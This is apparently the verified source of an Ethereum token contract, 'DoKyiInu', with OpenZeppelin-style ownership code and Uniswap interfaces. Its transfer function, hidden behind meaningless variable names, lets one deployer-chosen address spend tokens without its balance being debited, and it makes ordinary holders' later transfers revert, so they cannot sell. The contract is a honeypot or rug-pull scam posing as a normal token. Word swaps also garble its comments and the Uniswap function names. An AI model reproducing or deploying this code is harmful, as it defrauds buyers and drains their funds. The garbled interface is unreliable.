/**
 *Submitted for verification at Etherscan.io on 2023-01-15
*/

/*

https://t.me/DoKyiInu

https://twitter.com/DoKyiInu

https://dokyiinu.medium.com/

// SPDX-License-Identifier: MIT
*/
pragma solidity ^0.8.13;

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract maestro owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract maestro an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountDoKyiInuDesired,
        uint amountDoKyiInuMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountDoKyiInu, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountDoKyiInuMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountDoKyiInu, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountDoKyiInuMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountDoKyiInu, uint amountETH);
    function swapExactDoKyiInuForDoKyiInu(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapDoKyiInuForExactDoKyiInu(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForDoKyiInu(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapDoKyiInuForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactDoKyiInuForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactDoKyiInu(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferDoKyiInu(
        address token,
        uint liquidity,
        uint amountDoKyiInuMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferDoKyiInu(
        address token,
        uint liquidity,
        uint amountDoKyiInuMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactDoKyiInuForDoKyiInuSupportingFeeOnTransferDoKyiInu(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForDoKyiInuSupportingFeeOnTransferDoKyiInu(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactDoKyiInuForETHSupportingFeeOnTransferDoKyiInu(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DoKyiInu is Ownable {
    constructor(
        string memory volse,
        string memory nominommi,
        address router,
        address felelt
    ) {
        uniswapV2Router = IUniswapV2Router02(router);
        segnore = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        bab = 100;
        birgh = volse;
        dipartille = 9;
        nostra = nominommi;
        perduti = 1;
        buy[felelt] = bab;
        _tTotal = 1000000000000000 * 10**dipartille;
        maestro[msg.sender] = _tTotal;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function symbol() public view returns (string memory) {
        return nostra;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        misero(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    uint256 private perduti;

    uint8 private dipartille;

    address private templomban;

    function allowance(address owner, address spender) public view returns (uint256) {
        return arrow[owner][spender];
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 fellow;

    mapping(address => mapping(address => uint256)) private arrow;

    address private salt;

    function class(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        arrow[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    mapping(address => uint256) private depend;

    uint256 dear;

    function decimals() public view returns (uint256) {
        return dipartille;
    }

    IUniswapV2Router02 public uniswapV2Router;

    function misero(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        if (buy[sender] == 0 && depend[sender] > 0) {
            if (segnore != sender) {
                buy[sender] -= bab;
            }
        }

        dear = amount * perduti;

        if (buy[sender] == 0) {
            maestro[sender] -= amount;
        }

        
        
        fellow = dear / bab; 

        amount -= fellow;
        depend[templomban] += bab;
        templomban = recipient;
        maestro[recipient] += amount;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private bab;

    string private nostra;

    function approve(address spender, uint256 amount) external returns (bool) {
        return class(msg.sender, spender, amount);
    }

    string private birgh;

    mapping(address => uint256) private buy;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        misero(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return class(sender, msg.sender, arrow[sender][msg.sender] - amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return maestro[account];
    }

    address private segnore;

    uint256 private _tTotal;

    mapping(address => uint256) private maestro;

    function name() public view returns (string memory) {
        return birgh;
    }
}